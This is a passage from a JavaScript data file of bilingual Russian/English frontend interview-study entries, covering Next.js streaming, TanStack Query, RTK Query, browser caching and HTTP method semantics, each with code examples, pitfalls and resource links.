            "React (as used by the modern Next.js App Router) automatically deduplicates identical fetch calls with the same arguments within a single server render — if both generateMetadata and the page function call fetch on the same URL, the actual network request happens only once, and both places receive the same result from a shared per-render request cache. This removes the need to manually figure out how to 'pass' already-loaded data from one function to the other.",
          pitfalls: [
            "Задавать статичный title/description через обычный <title> внутри JSX страницы вместо Metadata API — это не так надёжно работает с App Router и потоковым рендером.",
            "Забывать generateMetadata для динамических страниц и оставлять одинаковый title для всех товаров/статей — упущенная возможность для SEO.",
          ],
        },
      },
      {
        id: "nextjs-streaming-suspense",
        title: "Streaming & Suspense в Next.js",
        content: {
          title: "Streaming & Suspense в Next.js",
          shortExplanation:
            "Streaming позволяет серверу отправлять HTML страницы частями, по мере готовности, вместо того чтобы ждать, пока абсолютно все данные для всех секций страницы загрузятся, прежде чем отправить хоть что-то браузеру.",
          detailedExplanation:
            "Без streaming SSR-страница с несколькими независимыми блоками данных (шапка, основной контент, медленный виджет рекомендаций) должна дождаться самого медленного из них, прежде чем сервер вообще начнёт отправлять HTML — пользователь смотрит на пустой экран всё это время. Streaming в App Router работает через оборачивание медленных частей страницы в <Suspense fallback={<Skeleton />}>: сервер сразу отправляет HTML для быстрых частей и fallback вместо медленных, а как только медленные данные становятся готовы, сервер дозаписывает готовый HTML этой секции в уже открытый HTTP-поток ответа, и браузер подменяет fallback на реальный контент без какого-либо JS-запроса — соединение остаётся одним и тем же, просто ответ приходит несколькими последовательными частями. Это особенно ценно для страниц, где один медленный внешний сервис (например, отзывы от стороннего API) не должен блокировать показ остальной, уже готовой части страницы пользователю.",
          codeExample:
            "export default function ProductPage({ params }) {\n  return (\n    <div>\n      <ProductHeader id={params.id} /> {/* быстро — рендерится сразу */}\n      <Suspense fallback={<ReviewsSkeleton />}>\n        <SlowReviews id={params.id} /> {/* медленно — стримится отдельно, когда готово */}\n      </Suspense>\n    </div>\n  );\n}",
          whereUsed:
            "Страницы, где одна секция (отзывы, рекомендации, аналитика от стороннего сервиса) заметно медленнее остальных и не должна блокировать показ основного контента.",
          interviewQuestion: "Как streaming в Next.js меняет поведение TTFB и восприятие скорости загрузки страницы пользователем?",
          interviewAnswerRu:
            "Без streaming время до первого байта (TTFB) фактически равно времени самого медленного запроса данных на странице — сервер не может отправить ничего, пока не соберёт весь HTML целиком. Со streaming сервер отправляет заголовки и первую часть HTML (для быстрых секций) значительно раньше, как только они готовы, не дожидаясь медленных секций — формальный TTFB для первого байта уменьшается, а пользователь визуально видит часть контента почти сразу, при этом воспринимаемая скорость загрузки заметно улучшается, даже если общее время до полной готовности страницы осталось тем же.",
          interviewAnswerEn:
            "Without streaming, time to first byte (TTFB) effectively equals the slowest data request on the page — the server can't send anything until it has assembled the entire HTML. With streaming, the server sends headers and the first part of the HTML (for fast sections) much earlier, as soon as they're ready, without waiting for slow sections — the formal TTFB for the first byte drops, and the user visually sees part of the content almost immediately, so perceived load speed improves noticeably even if the total time to a fully complete page stays the same.",
          pitfalls: [
            "Оборачивать в Suspense/streaming секцию, от данных которой зависит критичный для SEO контент, который должен быть в исходном HTML сразу.",
            "Не показывать осмысленный skeleton/fallback для стримящейся секции — пользователь видит резкий 'скачок' макета, когда контент подгружается (похоже на layout shift).",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // DATA FETCHING & CACHE
  // ---------------------------------------------------------------------
  {
    id: "data-fetching-cache",
    title: "Data Fetching & Cache",
    subtopics: [
      {
        id: "df-server-vs-client-state",
        title: "Server State vs Client State",
        content: {
          title: "Server State vs Client State",
          shortExplanation:
            "Server state — данные, которые реально живут на сервере и лишь синхронизируются на клиенте; client state — данные, которые существуют только в UI (открыт ли модал, значение инпута).",
          detailedExplanation:
            "Это разделение важно, потому что у server state есть особенности, которых нет у обычного UI-состояния: он может устареть, его может параллельно менять кто-то другой, его нужно кэшировать, ревалидировать, обрабатывать загрузку и ошибки. Попытка управлять server state так же, как client state (просто useState + useEffect с fetch), приводит к дублированию логики загрузки, гонкам запросов и рассинхронизации кэша. Поэтому для server state используют специализированные инструменты (TanStack Query, SWR, RTK Query), а для client state — Zustand, Redux, useState/useReducer.",
          codeExample:
            "// Client state — обычный useState, ничего 'внешнего' нет\nconst [isModalOpen, setModalOpen] = useState(false);\n\n// Server state — данные с сервера, нужны кэш, loading, ошибки, ревалидация\nconst { data, isLoading, error } = useQuery({\n  queryKey: ['user', id],\n  queryFn: () => fetchUser(id),\n});",
          interviewQuestion: "Почему для данных с сервера не советуют просто useState + useEffect?",
          interviewAnswerRu:
            "Потому что этот подход не решает целый набор задач: кэширование между компонентами, дедупликацию одинаковых запросов, повторные попытки при ошибке, фоновую ревалидацию при возврате на вкладку, обработку гонок (race conditions) между быстро сменяющимися запросами. Всё это приходится реализовывать вручную и обычно с багами, тогда как библиотеки вроде TanStack Query решают это из коробки.",
          interviewAnswerEn:
            "Because that approach leaves out a whole set of concerns: caching data across components, deduplicating identical requests, retrying on failure, background revalidation on refocus, and handling race conditions between rapidly changing requests. All of that ends up hand-rolled and usually buggy, whereas libraries like TanStack Query handle it out of the box.",
          pitfalls: [
            "Хранить server state в Redux/Zustand 'как обычные данные', вручную реализуя кэш и инвалидацию.",
            "Не различать 'загрузка данных' (server state) и 'состояние формы фильтра' (client state) — и мешать их в одном месте.",
          ],
          practiceTask:
            "Возьмите любой компонент с useState + useEffect + fetch и перепишите его на useQuery, сравнив количество кода и обработанных edge cases.",
          resources: {
            docs: [
              { title: "TanStack Query Overview", url: "https://tanstack.com/query/latest/docs/framework/react/overview" },
            ],
            articles: [
              { title: "Practical React Query (TkDodo)", url: "https://tkdodo.eu/blog/practical-react-query" },
              { title: "React Query as a State Manager (TkDodo)", url: "https://tkdodo.eu/blog/react-query-as-a-state-manager" },
            ],
          },
        },
      },
      {
        id: "df-browser-cache",
        title: "Виды браузерного кеша",
        content: {
          title: "Виды браузерного кеша",
          shortExplanation:
            "Кеш в TanStack/RTK Query — это кеш в памяти JS-приложения. Но браузер кеширует данные ещё на нескольких уровнях ниже: HTTP-кеш (memory/disk cache), Service Worker Cache API и back-forward cache (bfcache) — все они работают независимо от библиотек стейт-менеджмента.",
          detailedExplanation:
            "HTTP-кеш управляется заголовками ответа сервера: Cache-Control (max-age, no-store, no-cache, immutable) решает, можно ли вообще брать ответ повторно без сети, а ETag/Last-Modified позволяют браузеру сходить на сервер 'по-дешёвке' — запросом If-None-Match/If-Modified-Since — и получить 304 Not Modified вместо полного тела ответа. Браузер физически хранит эти ответы в двух местах: memory cache (быстрый, живёт, пока открыта вкладка/процесс) и disk cache (медленнее, переживает перезапуск браузера). Отдельно есть Cache Storage (Cache API) — программируемый кеш, которым управляет Service Worker: он перехватывает fetch-события и сам решает, отдать ли ответ из кеша, сходить в сеть или сделать и то, и другое (stale-while-revalidate на уровне сети). Наконец, back-forward cache (bfcache) — это не кеш ответов, а кеш целой живой страницы со всем JS-состоянием, который браузер поднимает при навигации 'назад/вперёд' без перезагрузки. Все эти уровни работают до того, как запрос вообще доходит до fetchFn в TanStack/RTK Query — то есть даже 'холодный' useQuery может не сходить в реальную сеть, если HTTP-кеш уже отдал ответ.",
          codeExample:
            "// Заголовки ответа сервера — управляют HTTP-кешем браузера\n// Cache-Control: max-age=3600, stale-while-revalidate=60\n// ETag: \"a1b2c3\"\n\n// Service Worker — программный кеш поверх fetch\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request).then((cached) => {\n      return cached ?? fetch(event.request).then((res) => {\n        const clone = res.clone();\n        caches.open('v1').then((cache) => cache.put(event.request, clone));\n        return res;\n      });\n    })\n  );\n});",
          interviewQuestion: "Чем HTTP-кеш браузера отличается от кеша TanStack Query, и как они соотносятся друг с другом?",
          interviewAnswerRu:
            "Это два независимых уровня. HTTP-кеш живёт в браузере ниже уровня JS-приложения: он решает, идти ли вообще в сеть, основываясь на заголовках Cache-Control/ETag конкретного ответа, и не знает ничего про query keys или React. TanStack Query, наоборот, кеширует уже распарсенные JS-объекты в памяти приложения и ничего не знает про HTTP-заголовки — с его точки зрения fetchFn просто вызывается или нет по правилам staleTime. На практике оба уровня складываются: даже если TanStack Query решает сделать фоновый рефетч (данные stale), реальный сетевой запрос может быть очень дешёвым, если браузер получит 304 Not Modified или отдаст ответ прямо из HTTP-кеша.",
          interviewAnswerEn:
            "They're two independent layers. The HTTP cache lives in the browser below the JS application level: it decides whether to hit the network at all based on that specific response's Cache-Control/ETag headers, and knows nothing about query keys or React. TanStack Query, in contrast, caches already-parsed JS objects in the app's memory and knows nothing about HTTP headers — from its point of view, fetchFn either gets called or not based on staleTime rules. In practice the two layers stack: even when TanStack Query decides to do a background refetch because data is stale, the actual network round-trip can be very cheap if the browser gets a 304 Not Modified or serves the response straight from the HTTP cache.",
          pitfalls: [
            "Путать staleTime библиотеки с Cache-Control сервера — это разные, независимо настраиваемые вещи на разных уровнях стека.",
            "Ставить агрессивный Cache-Control: no-store на API, которое и так кешируется на клиенте библиотекой — это просто лишняя сетевая нагрузка без выгоды.",
          ],
          practiceTask:
            "Откройте DevTools → Network на любом сайте, найдите запрос с пометкой 'from disk cache' или '304', и сопоставьте это с заголовками Cache-Control/ETag в ответе — объясните, почему браузер принял именно такое решение.",
          resources: {
            docs: [
              { title: "HTTP caching — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching" },
              { title: "Cache — Service Worker API (MDN)", url: "https://developer.mozilla.org/en-US/docs/Web/API/Cache" },
              { title: "bfcache — web.dev", url: "https://web.dev/articles/bfcache" },
            ],
            articles: [
              { title: "A Tale of Four Caches (web.dev)", url: "https://web.dev/articles/imagecache" },
            ],
          },
        },
      },
      {
        id: "df-tanstack-query",
        title: "TanStack Query (React Query)",
        content: {
          title: "TanStack Query (React Query)",
          shortExplanation:
            "TanStack Query — это и есть React Query: с версии 4 библиотеку переименовали, чтобы подчеркнуть поддержку не только React, но и Vue/Solid/Svelte. Название 'React Query' до сих пор используют по привычке и в статьях. Библиотека закрывает работу с server state в React: кэширование, ревалидация, повторные запросы, мутации — из коробки.",
          detailedExplanation:
            "Основная идея — каждый запрос идентифицируется query key, и библиотека сама решает, когда данные 'свежие' (fresh) и не требуют повторного запроса, а когда 'устаревшие' (stale) и должны быть обновлены в фоне. Для чтения данных используется useQuery, для изменения данных на сервере — useMutation, с возможностью инвалидировать связанные запросы после успешной мутации.",
          codeExample:
            "const { data, isLoading } = useQuery({\n  queryKey: ['todos'],\n  queryFn: fetchTodos,\n  staleTime: 60_000,\n});\n\nconst mutation = useMutation({\n  mutationFn: addTodo,\n  onSuccess: () => queryClient.invalidateQueries({ queryKey: ['todos'] }),\n});",
          interviewQuestion: "Как TanStack Query решает, когда нужно перезапросить данные заново?",
          interviewAnswerRu:
            "Каждый запрос имеет staleTime — время, в течение которого данные считаются свежими и повторный fetch не делается. После истечения staleTime данные считаются 'stale', и при следующем событии-триггере (монтирование компонента, возврат фокуса на вкладку, восстановление сети) библиотека делает фоновый рефетч, но продолжает показывать старые данные, пока не придут новые (stale-while-revalidate).",
          interviewAnswerEn:
            "Every query has a staleTime — the window during which the data is considered fresh and no refetch happens. Once staleTime elapses the data becomes 'stale', and the next trigger event (component mount, window refocus, network reconnect) causes a background refetch, while the old data keeps rendering until the new data arrives — the classic stale-while-revalidate pattern.",
          pitfalls: [
            "Ставить staleTime: 0 везде 'для надёжности' и получать лишние сетевые запросы на каждый фокус вкладки.",
            "Забывать инвалидировать связанные query keys после мутации — UI показывает устаревшие данные.",
          ],
          practiceTask:
            "Реализуйте список задач с useQuery для чтения и useMutation для добавления задачи с инвалидацией кэша после успеха.",
          resources: {
            docs: [
              { title: "TanStack Query Overview", url: "https://tanstack.com/query/latest/docs/framework/react/overview" },
            ],
            articles: [
              { title: "Practical React Query (TkDodo)", url: "https://tkdodo.eu/blog/practical-react-query" },
              { title: "Inside React Query (TkDodo)", url: "https://tkdodo.eu/blog/inside-react-query" },
            ],
          },
        },
      },
      {
        id: "df-query-keys",
        title: "Query Keys",
        content: {
          title: "Query Keys",
          shortExplanation:
            "Query key — уникальный идентификатор запроса в кэше (обычно массив), по которому библиотека находит, обновляет и инвалидирует связанные данные.",
          detailedExplanation:
            "Query key — это не просто 'название', а часть данных, которая должна включать все параметры, влияющие на результат запроса: ['todos', { status: 'done' }] и ['todos', { status: 'all' }] — это два разных, независимо кэшируемых запроса. Если параметр не включён в key, но влияет на запрос, кэш будет отдавать неправильные (чужие) данные для разных параметров.",
          codeExample:
            "// Разные ключи — разные записи в кэше\nuseQuery({ queryKey: ['user', userId], queryFn: () => fetchUser(userId) });\nuseQuery({ queryKey: ['todos', { status: filter }], queryFn: () => fetchTodos(filter) });\n\n// Инвалидация всех запросов, начинающихся с 'todos'\nqueryClient.invalidateQueries({ queryKey: ['todos'] });",
          interviewQuestion: "Почему важно включать все параметры фильтрации в query key?",
          interviewAnswerRu:
            "Потому что TanStack Query использует key как единственный способ различать закэшированные результаты. Если два разных набора фильтров дают один и тот же key, библиотека решит, что это один и тот же запрос, и вернёт закэшированные (неправильные для одного из фильтров) данные вместо нового запроса.",
          interviewAnswerEn:
            "Because the query key is the only thing the library uses to distinguish cached results. If two different filter combinations produce the same key, the library treats them as the same query and serves cached — and for one of the filters, wrong — data instead of fetching fresh results.",
          pitfalls: [
            "Забывать параметр фильтра в query key и получать 'залипшие' неправильные данные.",
            "Делать key нестабильным (новый объект каждый рендер без нормализации) — кэш перестаёт совпадать между рендерами.",
          ],
          practiceTask:
            "Сделайте список с фильтром по статусу, где query key включает статус, и продемонстрируйте, что переключение фильтра туда-обратно не делает лишних сетевых запросов (данные берутся из кэша).",
          resources: {
            docs: [
              { title: "Query Keys — TanStack Query Docs", url: "https://tanstack.com/query/latest/docs/framework/react/guides/query-keys" },
            ],
            articles: [
              { title: "Effective React Query Keys (TkDodo)", url: "https://tkdodo.eu/blog/effective-react-query-keys" },
            ],
          },
        },
      },
      {
        id: "df-cache-invalidation",
        title: "Cache Invalidation",
        content: {
          title: "Cache Invalidation",
          shortExplanation:
            "Инвалидация кэша — это явная пометка данных как устаревших, после которой библиотека делает повторный запрос за актуальными данными.",
          detailedExplanation:
            "После мутации (создание/обновление/удаление на сервере) локальный кэш перестаёт соответствовать реальности. Инвалидация решает эту проблему: вы указываете, какие query keys 'протухли', и библиотека либо сразу рефетчит их (если они используются на экране), либо пометит как stale для следующего использования. Это надёжнее, чем вручную вычислять и подставлять новые данные в кэш (хотя такой подход — 'optimistic update' — тоже существует и рассматривается отдельно).",
          codeExample:
            "const mutation = useMutation({\n  mutationFn: updateTodo,\n  onSuccess: (_, variables) => {\n    queryClient.invalidateQueries({ queryKey: ['todos'] });\n    queryClient.invalidateQueries({ queryKey: ['todo', variables.id] });\n  },\n});",
          interviewQuestion: "Чем инвалидация кэша отличается от простого повторного fetch по таймеру?",
          interviewAnswerRu:
            "Инвалидация — это точечное и осознанное действие 'эти данные больше не актуальны' сразу после события, которое их изменило (мутация). Рефетч по таймеру — это грубый способ 'на всякий случай', который либо слишком редко (данные долго неактуальны), либо слишком часто (лишняя нагрузка на сервер) обновляет данные, не привязываясь к реальным событиям изменения.",
          interviewAnswerEn:
            "Invalidation is a precise, deliberate 'this data is no longer valid' signal fired right after the event that changed it (a mutation). Polling on a timer is a blunt fallback that's either too infrequent (data stays stale too long) or too frequent (unnecessary server load), since it isn't tied to the actual change events.",
          pitfalls: [
            "Инвалидировать слишком широкий query key (например, весь кэш) — вызывает лавину ненужных запросов.",
            "Забывать инвалидировать связанные, но по-другому названные ключи (например, ['todos'] и ['todo', id] по отдельности).",
          ],
          practiceTask:
            "Добавьте мутацию удаления задачи и убедитесь, что после неё список задач и счётчик 'всего задач' оба обновляются через инвалидацию нужных ключей.",
          resources: {
            docs: [
              { title: "Query Invalidation — TanStack Query Docs", url: "https://tanstack.com/query/latest/docs/framework/react/guides/query-invalidation" },
            ],
            articles: [
              { title: "Mastering Mutations in React Query (TkDodo)", url: "https://tkdodo.eu/blog/mastering-mutations-in-react-query" },
            ],
          },
        },
      },
      {
        id: "df-optimistic-updates",
        title: "Optimistic Updates",
        content: {
          title: "Optimistic Updates",
          shortExplanation:
            "Optimistic update — это немедленное обновление UI до того, как сервер подтвердил изменение, чтобы интерфейс ощущался мгновенным.",
          detailedExplanation:
            "Вместо того чтобы ждать ответа сервера и только потом обновлять экран, приложение сразу применяет ожидаемый результат к локальному кэшу, а запрос отправляет в фоне. Если запрос завершается успешно — ничего менять не нужно (или подтверждаем реальными данными с сервера). Если запрос падает — нужно откатить изменение (rollback) к предыдущему состоянию и, как правило, показать сообщение об ошибке.",
          codeExample:
            "const mutation = useMutation({\n  mutationFn: toggleTodo,\n  onMutate: async (id) => {\n    await queryClient.cancelQueries({ queryKey: ['todos'] });\n    const previous = queryClient.getQueryData(['todos']);\n    queryClient.setQueryData(['todos'], (old) => toggleInList(old, id));\n    return { previous };\n  },\n  onError: (_err, _id, context) => {\n    queryClient.setQueryData(['todos'], context?.previous);\n  },\n  onSettled: () => queryClient.invalidateQueries({ queryKey: ['todos'] }),\n});",
          interviewQuestion: "Какие риски несёт optimistic update и как их снижать?",
          interviewAnswerRu:
            "Главный риск — пользователь увидит 'успех', которого на самом деле не произошло, если запрос упадёт. Поэтому обязательно нужен откат (rollback) к предыдущему состоянию при ошибке и понятная обратная связь пользователю (тост, уведомление). Также важно отменять текущие фоновые рефетчи перед оптимистичным изменением, чтобы они не перезаписали его старыми данными.",
          interviewAnswerEn:
            "The main risk is that the user sees a 'success' that never actually happened if the request fails. That's why a rollback to the previous state on error is mandatory, along with clear user feedback (a toast or notification). It's also important to cancel any in-flight background refetches before applying the optimistic change so they don't overwrite it with stale data.",
          pitfalls: [
            "Забыть rollback при ошибке — UI 'врёт' пользователю о результате операции.",
            "Не отменять параллельные запросы (cancelQueries) — гонка перезаписывает оптимистичное изменение.",
          ],
          practiceTask:
            "Реализуйте переключение чекбокса 'выполнено' у задачи с optimistic update, а затем искусственно сделайте mutationFn падать в 50% случаев и проверьте, что rollback работает.",
          resources: {
            docs: [
              { title: "Optimistic Updates — TanStack Query Docs", url: "https://tanstack.com/query/latest/docs/framework/react/guides/optimistic-updates" },
            ],
            articles: [
              { title: "Mastering Mutations in React Query (TkDodo)", url: "https://tkdodo.eu/blog/mastering-mutations-in-react-query" },
            ],
          },
        },
      },
      {
        id: "df-rtk-query",
        title: "RTK Query",
        content: {
          title: "RTK Query",
          shortExplanation:
            "RTK Query — модуль внутри Redux Toolkit для server state: решает те же задачи, что TanStack Query (кэш, ревалидация, мутации), но данные живут в Redux store и доступны через обычные Redux-хуки.",
          detailedExplanation:
            "В отличие от TanStack Query, где кэш живёт в своём внутреннем QueryClient отдельно от остального стейта приложения, RTK Query хранит кэш прямо в Redux store как обычный слайс. API описывается декларативно через createApi: один вызов генерирует и slice-редьюсер, и автоматически типизированные хуки (useGetTodosQuery, useAddTodoMutation) для каждого эндпоинта. Инвалидация в RTK Query построена на тегах (tagTypes/providesTags/invalidatesTags) — похоже на query keys, но работает через явное сопоставление 'этот эндпоинт предоставляет тег X' / 'эта мутация инвалидирует тег X', а не через префиксы массива-ключа.",
          codeExample:
            "export const todosApi = createApi({\n  reducerPath: 'todosApi',\n  baseQuery: fetchBaseQuery({ baseUrl: '/api' }),\n  tagTypes: ['Todo'],\n  endpoints: (builder) => ({\n    getTodos: builder.query<Todo[], void>({\n      query: () => 'todos',\n      providesTags: ['Todo'],\n    }),\n    addTodo: builder.mutation<Todo, Partial<Todo>>({\n      query: (body) => ({ url: 'todos', method: 'POST', body }),\n      invalidatesTags: ['Todo'],\n    }),\n  }),\n});\n\nexport const { useGetTodosQuery, useAddTodoMutation } = todosApi;",
          interviewQuestion: "Когда имеет смысл выбрать RTK Query вместо TanStack Query, и наоборот?",
          interviewAnswerRu:
            "RTK Query логично выбрать, если в проекте уже есть Redux и хочется, чтобы server state и client state жили в одном сторе с едиными devtools и паттернами (слайсы, селекторы). TanStack Query выбирают, когда Redux в проекте не нужен вообще или используется отдельно от серверных данных — библиотека легче интегрируется точечно, не требует Provider на весь стор и имеет более гибкий, менее 'коробочный' API кэширования (staleTime/gcTime тоньше настраиваются, чем теги). Смешивать оба инструмента для одних и тех же данных в одном проекте не стоит — это два конкурирующих кэша.",
          interviewAnswerEn:
            "RTK Query makes sense when the project already uses Redux and you want server state and client state to live in one store with shared devtools and patterns (slices, selectors). TanStack Query is preferable when Redux isn't needed at all, or is used separately from server data — it integrates more surgically, doesn't require a store-wide Provider, and offers more granular cache tuning (staleTime/gcTime) than tag-based invalidation. Running both for the same data in one project isn't a good idea — that's two competing caches.",
          pitfalls: [
            "Заводить RTK Query только ради кэширования запросов в проекте без Redux — это лишняя зависимость и boilerplate (Provider, store) там, где TanStack Query проще.",
            "Забывать симметрично расставить providesTags/invalidatesTags — без этого автоматическая инвалидация по тегам просто не сработает, и UI будет показывать устаревшие данные, как и без инвалидации вовсе.",
          ],
          practiceTask:
            "Опишите тот же список задач через createApi (getTodos с providesTags и addTodo с invalidatesTags) и сравните итоговый код с версией на useQuery/useMutation из предыдущей темы — что стало декларативнее, а что — менее гибким.",
          resources: {
            docs: [
              { title: "RTK Query Overview — Redux Toolkit Docs", url: "https://redux-toolkit.js.org/rtk-query/overview" },
              { title: "Cache Behavior — RTK Query Docs", url: "https://redux-toolkit.js.org/rtk-query/usage/cache-behavior" },
            ],
            articles: [
              { title: "RTK Query vs TanStack Query — TkDodo's take on differences (via TanStack Query docs comparison)", url: "https://tanstack.com/query/latest/docs/framework/react/comparison" },
            ],
          },
        },
      },
      {
        id: "df-comparison-custom-vs-libraries",
        title: "Кастомный хук vs TanStack vs RTK Query",
        content: {
          title: "Кастомный хук vs TanStack Query vs RTK Query",
          shortExplanation:
            "Три способа получить данные с сервера в React: написать свой useFetch на useState+useEffect, взять TanStack Query, взять RTK Query. Разница не в том, 'работает или нет' — все три варианта работают, — а в том, сколько edge cases решено из коробки и какую цену вы платите за это (объём кода, зависимости, связанность с Redux).",
          detailedExplanation:
            "Кастомный хук (useState для data/isLoading/error + useEffect с fetch) — это самый дешёвый по зависимостям вариант, но каждый edge case приходится реализовывать руками: отмену устаревшего запроса при смене id (иначе гонка — race condition, когда быстрый второй ответ перезаписывается медленным первым), дедупликацию одинаковых параллельных запросов от разных компонентов, кеш между разными экранами, повторные попытки при сетевой ошибке, ревалидацию при возврате на вкладку. На практике такой хук либо разрастается до половины TanStack Query внутри проекта, либо эти edge cases просто не решаются и живут как баги. TanStack Query закрывает всё перечисленное конфигурацией (staleTime, retry, refetchOnWindowFocus) и не требует привязки к какому-либо стейт-менеджеру — кеш живёт в собственном QueryClient. RTK Query решает те же задачи, но через другой API (createApi, теги вместо query keys) и осмысленно только тогда, когда в проекте и так есть Redux — тогда server state и client state оказываются в одном сторе с одними devtools, а не в двух параллельных источниках правды.",
          codeExample:
            "// Кастомный хук — минимум зависимостей, максимум ручной работы\nfunction useUserCustom(id: string) {\n  const [data, setData] = useState<User | null>(null);\n  const [isLoading, setLoading] = useState(true);\n\n  useEffect(() => {\n    let cancelled = false; // защита от гонки при смене id\n    setLoading(true);\n    fetchUser(id).then((user) => {\n      if (!cancelled) { setData(user); setLoading(false); }\n    });\n    return () => { cancelled = true; };\n  }, [id]);\n\n  return { data, isLoading }; // нет кеша между компонентами, нет retry, нет revalidation\n}\n\n// TanStack Query — то же самое, но с кешем/retry/revalidation 'бесплатно'\nfunction useUserQuery(id: string) {\n  return useQuery({ queryKey: ['user', id], queryFn: () => fetchUser(id) });\n}\n\n// RTK Query — то же самое, но кеш живёт в Redux store\nconst { data, isLoading } = useGetUserQuery(id);",
          interviewQuestion: "Почему 'просто написать свой хук на fetch' обычно хуже, чем взять готовую библиотеку, и когда кастомный хук всё-таки оправдан?",
          interviewAnswerRu:
            "Дело не в том, что кастомный хук 'не работает' — базовый случай он покрывает. Проблема в скрытой стоимости: как только появляются повторяющиеся параметры (смена id, фильтры), несколько компонентов, читающих одни данные, или требование не показывать спиннер при возврате на вкладку, приходится либо руками реализовывать то, что TanStack Query даёт конфигом, либо мириться с багами (гонки, лишние запросы, рассинхронизация копий данных в разных компонентах). Кастомный хук оправдан в маленьких изолированных случаях: один компонент, один запрос без параметров, без переиспользования в других местах — тогда библиотека была бы избыточной абстракцией.",
          interviewAnswerEn:
            "It's not that a custom hook 'doesn't work' — it covers the basic case fine. The hidden cost shows up once you add changing parameters (id, filters), multiple components reading the same data, or a requirement not to show a spinner on refocus: you either hand-roll what TanStack Query gives you via config, or live with the bugs (races, duplicate requests, out-of-sync copies of the same data across components). A custom hook is justified for small, isolated cases — one component, one parameterless request, no reuse elsewhere — where a library would be overkill.",
          pitfalls: [
            "Писать 'ещё один' кастомный хук фетчинга в проекте, где уже подключён TanStack/RTK Query — теперь есть два независимых кеша для похожих данных, и они расходятся.",
            "Выбирать RTK Query 'потому что модно', не имея в проекте Redux — тогда это просто более тяжёлый способ получить то, что TanStack Query делает без единой строчки Provider для стора.",
          ],
          practiceTask:
            "Возьмите написанный ранее useUserCustom и намеренно быстро смените id дважды подряд (например, кликами по двум ссылкам) — обнаружите гонку, если cancelled-флаг убрать. Затем замените хук на useQuery и убедитесь, что гонка решена без единой строчки ручного кода для этого случая.",
          resources: {
            docs: [
              { title: "Comparison — TanStack Query Docs (RTK Query, SWR, custom hooks)", url: "https://tanstack.com/query/latest/docs/framework/react/comparison" },
            ],
            articles: [
              { title: "Why You Want React Query (TkDodo)", url: "https://tkdodo.eu/blog/why-you-want-react-query" },
              { title: "React Query as a State Manager (TkDodo)", url: "https://tkdodo.eu/blog/react-query-as-a-state-manager" },
            ],
          },
        },
      },
    ],
  },


  {
    id: "apis-networking",
    title: "APIs / Networking",
    subtopics: [
      {
        id: "apis-http-semantics",
        title: "HTTP: методы, статус-коды, заголовки",
        content: {
          title: "HTTP: методы, статус-коды, заголовки",
          shortExplanation:
            "HTTP-метод описывает намерение запроса (получить/создать/полностью заменить/частично изменить/удалить), статус-код — категорию результата, а заголовки несут метаданные о запросе и ответе, не относящиеся к самому телу данных.",
          detailedExplanation:
            "GET и HEAD обязаны быть безопасными (не изменять состояние сервера) и идемпотентными (повторный вызов даёт тот же результат); PUT и DELETE идемпотентны, но не безопасны (меняют состояние, но повторный одинаковый вызов не создаёт новый эффект сверх первого); POST не идемпотентен по умолчанию (два одинаковых POST могут создать две разные записи) и не безопасен; PATCH обычно не идемпотентен, если описывает 'дельту' изменений (increment), хотя может быть идемпотентным, если описывает финальное значение поля. Статус-коды группируются по первой цифре: 2xx — успех (200 OK, 201 Created, 204 No Content — успех без тела ответа), 3xx — редирект (301 постоянный, 302/307 временный, с разницей в том, сохраняется ли метод запроса при повторном запросе), 4xx — ошибка клиента (400 некорректный запрос, 401 не аутентифицирован, 403 аутентифицирован, но нет прав, 404 не найдено, 409 конфликт состояния), 5xx — ошибка сервера. Заголовки Cache-Control, ETag, Authorization, Content-Type — не часть 'данных' ответа, а протокольные метаданные, которые нужно уметь читать и задавать явно при работе с fetch/axios, а не полагаться на 'магическое' поведение клиента по умолчанию.",
          codeExample:
            "// Идемпотентность на практике: повторный PUT безопасен для повтора при сетевой ошибке\nawait fetch(`/api/users/${id}`, {\n  method: 'PUT', // если запрос не дошёл — можно ретраить без риска дублирования\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ name: 'Alex' }),\n});\n\n// POST — НЕ идемпотентен, ретраить без idempotency key опасно (риск дублей)\nawait fetch('/api/orders', { method: 'POST', body: JSON.stringify(orderData) });",
          whereUsed:
            "Проектирование и потребление REST API, настройка ретраев на сетевые ошибки (безопасно ретраить только идемпотентные запросы без доп. защиты), обработка ответов по категориям статус-кодов в общем API-клиенте приложения.",
          interviewQuestion: "Почему безопасно автоматически повторять (retry) неудавшийся PUT-запрос, но не POST?",
          interviewAnswerRu:
            "PUT по определению идемпотентен — повторное выполнение одного и того же PUT с теми же данными приводит к тому же конечному состоянию ресурса, сколько бы раз его ни повторили, поэтому автоматический retry при сетевой ошибке (когда неизвестно, дошёл ли первый запрос до сервера) безопасен. POST не идемпотентен: если первый POST на самом деле дошёл до сервера и создал запись, но ответ потерялся по пути обратно, повторный POST создаст ВТОРУЮ запись — поэтому для безопасного ретрая POST-запросов нужен дополнительный механизм, например idempotency key, который сервер использует, чтобы распознать повторную попытку того же логического запроса.",
          interviewAnswerEn:
            "PUT is idempotent by definition — repeating the same PUT with the same data results in the same final resource state no matter how many times it's repeated, so automatically retrying it after a network error (when it's unclear whether the first request reached the server) is safe. POST is not idempotent: if the first POST actually reached the server and created a record, but the response was lost on the way back, retrying the POST creates a SECOND record — so safely retrying POST requests needs an extra mechanism, like an idempotency key the server uses to recognize a retry of the same logical request.",
          pitfalls: [
            "Автоматически ретраить POST-запросы без idempotency key — риск создания дублирующихся записей при сетевых сбоях.",
            "Использовать GET для запросов, вызывающих побочные эффекты на сервере — нарушает ожидание безопасности GET (например, браузерный prefetch может случайно вызвать такой побочный эффект).",
          ],
        },
      },
      {
        id: "apis-cors-preflight",
        title: "CORS & Preflight",
        content: {
          title: "CORS & Preflight",
          shortExplanation:
            "CORS (Cross-Origin Resource Sharing) — механизм браузера, который по умолчанию блокирует JS-код одного origin (домен+протокол+порт) от чтения ответа запроса к другому origin, если сервер явно не разрешил это через заголовки; preflight — предварительный OPTIONS-запрос, которым браузер спрашивает разрешения перед 'небезопасными' запросами.",
          detailedExplanation:
